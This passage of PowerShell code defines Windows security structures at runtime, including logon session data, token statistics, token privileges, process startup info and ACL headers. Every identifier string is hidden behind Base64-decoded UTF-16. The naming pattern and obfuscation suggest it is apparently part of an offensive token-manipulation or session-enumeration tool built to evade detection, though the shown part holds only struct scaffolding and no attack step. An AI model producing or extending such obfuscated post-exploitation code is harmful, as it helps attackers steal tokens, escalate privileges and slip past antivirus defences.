    $Attributes = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
	$TypeBuilder = $ModuleBuilder.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABVAEkARAA='))), $Attributes, [System.ValueType], 8)
	$TypeBuilder.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAHcAUABhAHIAdAA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
	$TypeBuilder.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABpAGcAaABQAGEAcgB0AA=='))), [Int32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
	$LUID = $TypeBuilder.CreateType()
    $Attributes = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
	$TypeBuilder = $ModuleBuilder.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABPAEsARQBOAF8AUwBUAEEAVABJAFMAVABJAEMAUwA='))), $Attributes, [System.ValueType])
	$TypeBuilder.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAGsAZQBuAEkAZAA='))), $LUID, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
	$TypeBuilder.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAaABlAG4AdABpAGMAYQB0AGkAbwBuAEkAZAA='))), $LUID, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    $TypeBuilder.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHAAaQByAGEAdABpAG8AbgBUAGkAbQBlAA=='))), $LARGE_INTEGER, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    $TypeBuilder.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAGsAZQBuAFQAeQBwAGUA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    $TypeBuilder.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBtAHAAZQByAHMAbwBuAGEAdABpAG8AbgBMAGUAdgBlAGwA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    $TypeBuilder.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RAB5AG4AYQBtAGkAYwBDAGgAYQByAGcAZQBkAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    $TypeBuilder.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RAB5AG4AYQBtAGkAYwBBAHYAYQBpAGwAYQBiAGwAZQA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    $TypeBuilder.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAEMAbwB1AG4AdAA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    $TypeBuilder.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGkAdgBpAGwAZQBnAGUAQwBvAHUAbgB0AA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    $TypeBuilder.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBvAGQAaQBmAGkAZQBkAEkAZAA='))), $LUID, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
	$TOKEN_STATISTICS = $TypeBuilder.CreateType()
    $Attributes = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
	$TypeBuilder = $ModuleBuilder.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABTAEEAXwBVAE4ASQBDAE8ARABFAF8AUwBUAFIASQBOAEcA'))), $Attributes, [System.ValueType])
	$TypeBuilder.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABlAG4AZwB0AGgA'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
	$TypeBuilder.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAHgAaQBtAHUAbQBMAGUAbgBnAHQAaAA='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    $TypeBuilder.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgB1AGYAZgBlAHIA'))), [IntPtr], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
	$LSA_UNICODE_STRING = $TypeBuilder.CreateType()
    $Attributes = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
	$TypeBuilder = $ModuleBuilder.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABTAEEAXwBMAEEAUwBUAF8ASQBOAFQARQBSAF8ATABPAEcATwBOAF8ASQBOAEYATwA='))), $Attributes, [System.ValueType])
	$TypeBuilder.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABhAHMAdABTAHUAYwBjAGUAcwBzAGYAdQBsAEwAbwBnAG8AbgA='))), $LARGE_INTEGER, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
	$TypeBuilder.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABhAHMAdABGAGEAaQBsAGUAZABMAG8AZwBvAG4A'))), $LARGE_INTEGER, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    $TypeBuilder.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBhAGkAbABlAGQAQQB0AHQAZQBtAHAAdABDAG8AdQBuAHQAUwBpAG4AYwBlAEwAYQBzAHQAUwB1AGMAYwBlAHMAcwBmAHUAbABMAG8AZwBvAG4A'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
	$LSA_LAST_INTER_LOGON_INFO = $TypeBuilder.CreateType()
    $Attributes = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
	$TypeBuilder = $ModuleBuilder.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBFAEMAVQBSAEkAVABZAF8ATABPAEcATwBOAF8AUwBFAFMAUwBJAE8ATgBfAEQAQQBUAEEA'))), $Attributes, [System.ValueType])
	$TypeBuilder.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
	$TypeBuilder.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGcAaQBuAEkARAA='))), $LUID, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    $TypeBuilder.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBuAGEAbQBlAA=='))), $LSA_UNICODE_STRING, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    $TypeBuilder.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGcAaQBuAEQAbwBtAGEAaQBuAA=='))), $LSA_UNICODE_STRING, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    $TypeBuilder.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAaABlAG4AdABpAGMAYQB0AGkAbwBuAFAAYQBjAGsAYQBnAGUA'))), $LSA_UNICODE_STRING, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    $TypeBuilder.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGcAbwBuAFQAeQBwAGUA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    $TypeBuilder.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHMAcwBpAG8AbgA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    $TypeBuilder.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAGQA'))), [IntPtr], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    $TypeBuilder.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGcAaQBuAFQAaQBtAGUA'))), $LARGE_INTEGER, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    $TypeBuilder.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGcAaQBuAFMAZQByAHYAZQByAA=='))), $LSA_UNICODE_STRING, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    $TypeBuilder.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABuAHMARABvAG0AYQBpAG4ATgBhAG0AZQA='))), $LSA_UNICODE_STRING, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    $TypeBuilder.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBwAG4A'))), $LSA_UNICODE_STRING, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    $TypeBuilder.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBGAGwAYQBnAHMA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    $TypeBuilder.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABhAHMAdABMAG8AZwBvAG4ASQBuAGYAbwA='))), $LSA_LAST_INTER_LOGON_INFO, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    $TypeBuilder.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGcAbwBuAFMAYwByAGkAcAB0AA=='))), $LSA_UNICODE_STRING, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    $TypeBuilder.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AZgBpAGwAZQBQAGEAdABoAA=='))), $LSA_UNICODE_STRING, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    $TypeBuilder.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABvAG0AZQBEAGkAcgBlAGMAdABvAHIAeQA='))), $LSA_UNICODE_STRING, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    $TypeBuilder.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABvAG0AZQBEAGkAcgBlAGMAdABvAHIAeQBEAHIAaQB2AGUA'))), $LSA_UNICODE_STRING, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    $TypeBuilder.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGcAbwBmAGYAVABpAG0AZQA='))), $LARGE_INTEGER, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    $TypeBuilder.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SwBpAGMAawBPAGYAZgBUAGkAbQBlAA=='))), $LARGE_INTEGER, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    $TypeBuilder.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAHMAcwB3AG8AcgBkAEwAYQBzAHQAUwBlAHQA'))), $LARGE_INTEGER, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    $TypeBuilder.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAHMAcwB3AG8AcgBkAEMAYQBuAEMAaABhAG4AZwBlAA=='))), $LARGE_INTEGER, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    $TypeBuilder.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAHMAcwB3AG8AcgBkAE0AdQBzAHQAQwBoAGEAbgBnAGUA'))), $LARGE_INTEGER, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
	$SECURITY_LOGON_SESSION_DATA = $TypeBuilder.CreateType()
    $Attributes = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
	$TypeBuilder = $ModuleBuilder.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBUAEEAUgBUAFUAUABJAE4ARgBPAA=='))), $Attributes, [System.ValueType])
	$TypeBuilder.DefineField('cb', [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
	$TypeBuilder.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bABwAFIAZQBzAGUAcgB2AGUAZAA='))), [IntPtr], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    $TypeBuilder.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bABwAEQAZQBzAGsAdABvAHAA'))), [IntPtr], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    $TypeBuilder.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bABwAFQAaQB0AGwAZQA='))), [IntPtr], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    $TypeBuilder.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZAB3AFgA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    $TypeBuilder.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZAB3AFkA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    $TypeBuilder.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZAB3AFgAUwBpAHoAZQA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    $TypeBuilder.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZAB3AFkAUwBpAHoAZQA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    $TypeBuilder.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZAB3AFgAQwBvAHUAbgB0AEMAaABhAHIAcwA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    $TypeBuilder.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZAB3AFkAQwBvAHUAbgB0AEMAaABhAHIAcwA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    $TypeBuilder.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZAB3AEYAaQBsAGwAQQB0AHQAcgBpAGIAdQB0AGUA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    $TypeBuilder.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZAB3AEYAbABhAGcAcwA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    $TypeBuilder.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dwBTAGgAbwB3AFcAaQBuAGQAbwB3AA=='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    $TypeBuilder.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YwBiAFIAZQBzAGUAcgB2AGUAZAAyAA=='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    $TypeBuilder.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bABwAFIAZQBzAGUAcgB2AGUAZAAyAA=='))), [IntPtr], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    $TypeBuilder.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aABTAHQAZABJAG4AcAB1AHQA'))), [IntPtr], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    $TypeBuilder.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aABTAHQAZABPAHUAdABwAHUAdAA='))), [IntPtr], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    $TypeBuilder.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aABTAHQAZABFAHIAcgBvAHIA'))), [IntPtr], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
	$STARTUPINFO = $TypeBuilder.CreateType()
    $Attributes = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
	$TypeBuilder = $ModuleBuilder.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABSAE8AQwBFAFMAUwBfAEkATgBGAE8AUgBNAEEAVABJAE8ATgA='))), $Attributes, [System.ValueType])
	$TypeBuilder.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aABQAHIAbwBjAGUAcwBzAA=='))), [IntPtr], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
	$TypeBuilder.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aABUAGgAcgBlAGEAZAA='))), [IntPtr], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    $TypeBuilder.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZAB3AFAAcgBvAGMAZQBzAHMASQBkAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    $TypeBuilder.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZAB3AFQAaAByAGUAYQBkAEkAZAA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
	$PROCESS_INFORMATION = $TypeBuilder.CreateType()
    $Attributes = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
	$TypeBuilder = $ModuleBuilder.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABPAEsARQBOAF8ARQBMAEUAVgBBAFQASQBPAE4A'))), $Attributes, [System.ValueType])
	$TypeBuilder.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAGsAZQBuAEkAcwBFAGwAZQB2AGEAdABlAGQA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
	$TOKEN_ELEVATION = $TypeBuilder.CreateType()
    $Attributes = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
    $TypeBuilder = $ModuleBuilder.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABVAEkARABfAEEATgBEAF8AQQBUAFQAUgBJAEIAVQBUAEUAUwA='))), $Attributes, [System.ValueType], 12)
    $TypeBuilder.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TAB1AGkAZAA='))), $LUID, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    $TypeBuilder.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB0AHQAcgBpAGIAdQB0AGUAcwA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    $LUID_AND_ATTRIBUTES = $TypeBuilder.CreateType()
    $Attributes = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
    $TypeBuilder = $ModuleBuilder.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABPAEsARQBOAF8AUABSAEkAVgBJAEwARQBHAEUAUwA='))), $Attributes, [System.ValueType], 16)
    $TypeBuilder.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGkAdgBpAGwAZQBnAGUAQwBvAHUAbgB0AA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    $TypeBuilder.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGkAdgBpAGwAZQBnAGUAcwA='))), $LUID_AND_ATTRIBUTES, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    $TOKEN_PRIVILEGES = $TypeBuilder.CreateType()
    $Attributes = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
    $TypeBuilder = $ModuleBuilder.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBDAEUAXwBIAEUAQQBEAEUAUgA='))), $Attributes, [System.ValueType])
    $TypeBuilder.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGUAVAB5AHAAZQA='))), [Byte], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    $TypeBuilder.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGUARgBsAGEAZwBzAA=='))), [Byte], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    $TypeBuilder.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGUAUwBpAHoAZQA='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    $ACE_HEADER = $TypeBuilder.CreateType()
    $Attributes = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
    $TypeBuilder = $ModuleBuilder.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBDAEwA'))), $Attributes, [System.ValueType])
    $TypeBuilder.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGwAUgBlAHYAaQBzAGkAbwBuAA=='))), [Byte], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    $TypeBuilder.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBiAHoAMQA='))), [Byte], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
